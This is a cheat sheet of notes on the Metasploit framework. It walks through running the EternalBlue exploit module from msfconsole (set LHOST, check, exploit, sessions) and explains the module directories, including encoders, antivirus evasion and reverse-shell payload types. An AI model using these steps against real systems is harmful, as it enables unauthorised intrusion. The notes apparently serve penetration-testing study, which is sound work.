# Metasploit

## MSFConsole
Main cli launched by:
```sh
msfconsole

msf6>
```

Find a module:
```sh
msf6 > search ms17-010
msf6 > search type:auxiliary telnet
msf6 > use 0
```

Rankings:
| Ranking | Description |
| ------- | ----------- |
| ExcellentRanking | The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances (WMF Escape()). |
| GreatRanking | The exploit has a default target AND either auto-detects the appropriate target or uses an application-specific return address AFTER a version check. |
| GoodRanking | The exploit has a default target and it is the “common case” for this type of software (English, Windows 7 for a desktop app, 2012 for server, etc). Exploit does not auto-detect the target. |
| NormalRanking	| The exploit is otherwise reliable, but depends on a specific version that is not the “common case” for this type of software and can’t (or doesn’t) reliably autodetect. |
| AverageRanking | The exploit is generally unreliable or difficult to exploit, but has a success rate of 50% or more for common platforms. |
| LowRanking | The exploit is nearly impossible to exploit (under 50% success rate) for common platforms. |
| ManualRanking	| The exploit is unstable or difficult to exploit and is basically a DoS (15% success rate or lower). This ranking is also used when the module has no use unless specifically configured by the user (e.g.: exploit/unix/webapp/php_eval). |


Navigate to a directory to use a module:
```sh
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Get information and modules:
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > info
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

Set parameters. Confirm with `show options`:
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.10.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset LHOST 10.10.10.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
```

Global parameters apply to all modules
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.10.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > unsetg rhosts 10.10.10.10
```
Check Exploit
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
```

Exploit
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
```

Sessions
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 3
```


## Modules
By default modules are located in `/opt/metasploit-framework/embedded/framework/modules/`

### /auxilary
Scanners, crawlers and fuzzers.

### /encoders
Alter exploits and payloads in hopes to obfuscate and reduce chances of detection.

### /evaison
Attempt to evade anti-virus

### /nops
No Operation literally do nothing. They are represented in the Intel x86 CPU famile with `0x90` following which the CPU will do nothing for one cycle. This is often used as a buffer to achieve consistent payload sizes.

### /payloads
Code that will run on a target system

- *Adapters*: A payload can be wrapped inside a Powershell adapter which can be called by a PS command.
- *Singles*: Self-contained payloads (add user, launch notepad.exe) that do not need an additional component to run.
- *Stagers*: Setting up a connection between Metasploit and the target system. Uplod a stager on the target system that will download additional stages. Useful when limited size is needed.
- *Stage*: A step downloaded by the `stager`

#### Inline / Single Payload
Indicated by `_` between "shell" and "reverse" staged

    1. `generic/shell_reverse_tcp` - Inline payload
    2. `windows/x64/shell/reverse_tcp` - Staged payload

### /post
Used in the final stage.

## Tools
Useful from recon to research.
- msfvenom
- pattern_create
- pattern_offset
